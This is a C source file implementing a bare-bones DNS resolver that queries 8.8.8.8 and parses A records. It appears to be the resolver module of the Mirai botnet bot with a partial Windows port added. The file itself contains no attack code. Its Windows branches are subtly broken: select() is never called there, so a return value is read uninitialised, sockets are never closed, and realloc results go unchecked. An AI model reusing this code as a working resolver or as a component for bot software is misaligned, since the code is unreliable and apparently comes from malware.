#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>
#endif

#include "includes.h"
#include "resolv.h"
#include "util.h"
#include "rand.h"
#include "protocol.h"

void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
{
    char *dst_pos = dst_hostname;
    char *lbl = dst_pos++;
    int curr_len = 0;
    char c;
    int i = 0;

    while ((c = src_domain[i++]) != 0)
    {
        if (c == '.' || c == 0)
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

void resolv_skip_name(char *reader, char *buffer, int *count)
{
    unsigned char *ubuffer = (unsigned char *)buffer;
    int jumped = 0, offset;
    *count = 1;
    while (*reader != 0)
    {
        if (*reader >= 192)
        {
            offset = ((*reader) << 8) + *(reader+1) - 49152;
            reader = buffer + offset;
            jumped = 1;
        }
        else
        {
            reader++;
            (*count)++;
        }
        if (!jumped)
            continue;
        else
            break;
    }
    reader++;
    (*count)++;
}

struct resolv_entries *resolv_lookup(const char *domain)
{
    struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    resolv_domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = rand_next() % 0xffff;

    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    set_in_addr(&addr.sin_addr, INET_ADDR(8,8,8,8));
    addr.sin_port = htons(53);

    // Set up the dns query
    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); // Recursion desired;
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
#ifndef _WIN32
            close(fd);
#endif
        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to create socket\n");
#endif
#ifndef _WIN32
            sleep(1);
#endif
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to call connect on udp socket\n");
#endif
#ifndef _WIN32
            sleep(1);
#endif
            continue;
        }

        if (send(fd, query, query_len, 0) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to send packet: %d\n", errno);
#endif
#ifndef _WIN32
            sleep(1);
#endif
            continue;
        }

    #ifndef _WIN32
    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    #endif
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
#ifndef _WIN32
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);
#endif

        if (nfds == -1)
        {
#ifdef DEBUG
            printf("[resolv] select() failed\n");
#endif
            break;
        }
        else if (nfds == 0)
        {
#ifdef DEBUG
            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
#endif
            continue;
        }
        else if (FD_ISSET(fd, &fdset))
        {
#ifdef DEBUG
            printf("[resolv] Got response from select\n");
#endif
            int ret = recvfrom(fd, response, sizeof (response), 0, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)))
                continue;

            dnsh = (struct dnshdr *)response;
            qname = (char *)(dnsh + 1);
            dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
            name = (char *)(dnst + 1);

            if (dnsh->id != dns_id)
                continue;
            if (dnsh->ancount == 0)
                continue;

            ancount = ntohs(dnsh->ancount);
            while (ancount-- > 0)
            {
                struct dns_resource *r_data = NULL;

                resolv_skip_name(name, response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

                if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP))
                {
                    if (ntohs(r_data->data_len) == 4)
                    {
                        uint32_t *p;
                        uint8_t tmp_buf[4];
                        for(i = 0; i < 4; i++)
                            tmp_buf[i] = name[i];

                        p = (uint32_t *)tmp_buf;

                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                        entries->addrs[entries->addrs_len++] = (*p);
#ifdef DEBUG
                        printf("[resolv] Found IP address: %08x\n", (*p));
#endif
                    }

                    name = name + ntohs(r_data->data_len);
                } else {
                    resolv_skip_name(name, response, &stop);
                    name = name + stop;
                }
            }
        }

        break;
    }

    #ifndef _WIN32
    close(fd);
    #endif

    #ifdef DEBUG
    printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
    #endif

    if (entries->addrs_len > 0)
        return entries;
    else
    {
        resolv_entries_free(entries);
        return NULL;
    }
}
void resolv_entries_free(struct resolv_entries *entries)


{
    if (entries == NULL)
        return;
    if (entries->addrs != NULL)
        free(entries->addrs);
    free(entries);
}